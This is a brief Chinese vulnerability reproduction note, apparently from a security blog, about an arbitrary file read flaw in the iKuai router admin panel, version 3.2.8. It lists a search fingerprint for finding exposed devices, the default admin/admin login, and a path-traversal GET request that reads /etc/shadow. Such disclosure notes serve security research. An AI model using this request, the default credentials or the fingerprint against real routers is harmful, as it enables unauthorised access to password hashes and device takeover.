---
title: "iKuai 后台任意文件读取漏洞"
date: 2026-10-18 09:15:32
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "iKuai"
tags:
  - "iKuai"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

参考链接：

- https://forum.ywhack.com/thread-115307-1-8.html

## 漏洞影响

影响版本，不一定是绝对版本，也可能其它版本都存在：

```
3.2.8 x64 Build201910101758
```

## 网络测绘

```
title="登录爱快流控路由"
```

## 漏洞复现

默认用户名/密码：admin/admin

poc：

```
GET /Action/download?filename=../../../../../../etc/shadow HTTP/1.1
Host：
....
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/iKuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
